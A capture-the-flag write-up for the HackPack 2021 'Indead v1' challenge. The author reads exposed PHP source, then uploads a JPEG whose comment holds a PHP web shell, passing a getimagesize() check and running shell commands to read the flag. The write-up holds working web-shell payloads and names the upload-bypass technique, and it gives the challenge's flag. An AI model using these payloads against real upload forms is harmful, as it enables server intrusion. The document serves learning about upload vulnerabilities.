# Indead v1

> Job posting website for security experts, pentesters and hackers. [http://indead-upload-avatar.ctf2021.hackpack.club](http://indead-upload-avatar.ctf2021.hackpack.club/)

I took the first look at the website, there seems to be a file upload function on the index page

![image-Indeadv1-1](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-1.png?raw=true)

Source code :

```html
<form action="/" method="POST" enctype="multipart/form-data">
    <div class="form-row">
        <div class="form-group col-md-6">
            <input type="file" name="avatar">
        </div>
    </div>
    <button type="submit" class="btn btn-success">Upload picture</button>
</form>
```

I tried to upload a random file

![image-Indeadv1-2](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-2.png?raw=true)

Analyzing the page source, I found out that the image was pushed to this very weird path `/very_long_directory_path/`

![image-Indeadv1-3](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-3.png?raw=true)

I tried to read if there's any hidden file around it that they used to hide the flag, and It worked on `/very_long_directory_path/flag.txt`. Unfortunately, the flag we got on that path was a fake flag

I tried to upload a shell to the same function again and I got this

![image-Indeadv1-4](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-4.png?raw=true)

I was wondering what kind of security implementation that they were using

I tried to access to `robots.txt` file and I was lucky

![image-Indeadv1-5](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-5.png?raw=true)

Now I know they're probably exposing the PHP source code to the internet. My first try is the `index.phps` file

![image-Indeadv1-6](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-6.png?raw=true)

`core.php` was also exposed, and it was about the uploading function which is what I needed

![image-Indeadv1-7](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-7.png?raw=true)

People who are wary of falsified MIME types and extra file extensions often advocate the use of something like `getimagesize() `

To exploit this kind of vulnerability I used [jhead](http://www.sentex.net/~mwandel/jhead/) tool to embed a comment inside a decoy image file

```
C:\Users\Admin\Downloads>jhead.exe -ce uniguri.jpg.php
Modified: uniguri.jpg.php
```

Shell injected :

```php
<?php echo shell_exec("pwd"); echo shell_exec("ls -la"); __halt_compiler();
```

The `__halt_compiler()`function call is there so that the image data doesn’t accidentally get interpreted as PHP and throw a parse error. This is why the output stops before outputting the actual image data

It is successfully uploaded

![image-Indeadv1-8](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-8.png?raw=true)

After wandering around, I found out that the flag was being hidden at `/www/html/flag.txt`

I crafted the final shell to read the flag :

```php
<?php echo shell_exec("cat /www/html/flag.txt"); __halt_compiler();
```

![image-Indeadv1-9](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-9.png?raw=true)

Flag :

```
flag{y3t_an0ther_file_uplo@d_vuln}
```

